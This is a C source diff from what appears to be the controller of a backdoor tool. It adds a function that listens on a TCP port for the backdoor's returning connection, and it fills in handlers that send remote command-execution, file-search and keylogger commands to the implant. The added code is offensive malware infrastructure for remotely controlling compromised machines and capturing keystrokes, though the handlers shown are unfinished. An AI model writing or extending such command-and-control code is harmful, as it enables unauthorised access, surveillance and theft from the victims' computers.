@@ -7,6 +7,7 @@ static void executeSystemCall(netInfo *info, char *commandData);
 static void findFile(netInfo *info, char *commandData);
 static void keylogger(netInfo *info);
 static void sendCommand(netInfo *info, int command, char *commandData);
+static int acceptReturningTcpConnection();
 
 int main (int argc, char **argv)
 {
@@ -76,17 +77,66 @@ int main (int argc, char **argv)
 
 static void executeSystemCall(netInfo *info, char *commandData)
 {
+    int backdoorSocket = 0;
     
+    // Send the command to the backdoor
+    sendCommand(info, EXECUTE_SYSTEM_CALL, commandData);
+    
+    // Wait for the response from the backdoor
+    backdoorSocket = acceptReturningTcpConnection();
 }
 
 static void findFile(netInfo *info, char *commandData)
 {
+    int backdoorSocket = 0;
     
+    // Send the command to the backdoor
+    sendCommand(info, FIND_FILE, commandData);
+    
+    // Wait for the response from the backdoor
+    backdoorSocket = acceptReturningTcpConnection();
 }
 
 static void keylogger(netInfo *info)
 {
+    // Send the command to the backdoor
     sendCommand(info, KEYLOGGER, NULL);
+}
+
+static int acceptReturningTcpConnection()
+{
+    int listenSocket = 0;
+    int backdoorSocket = 0;
+    int one = 1;
+    struct sockaddr_in sa;
+    socklen_t sa_len;
+    
+    if ((listenSocket = socket(AF_INET, SOCK_STREAM, 0)) == -1)
+    {
+        systemFatal("Can't create a socket");
+    }
+    
+    if (setsockopt(listenSocket, SOL_SOCKET, SO_REUSEADDR, &one, sizeof(one)) == -1)
+    {
+        systemFatal("Cannot set socket options");
+    }
+    
+    if (bind_address(CONNECTION_PORT, &listenSocket) == -1)
+    {
+        systemFatal("Error binding the socket");
+    }
+    
+    if (listen(listenSocket, 5) == -1)
+    {
+        systemFatal("Listen error");
+    }
+    
+    if ((backdoorSocket = accept(listenSocket, (struct sockaddr *)&sa, &sa_len)) == -1)
+    {
+        systemFatal("Error accepting connection");
+    }
+    
+    return backdoorSocket;
 }
 
 static void sendCommand(netInfo *info, int command, char *commandData)
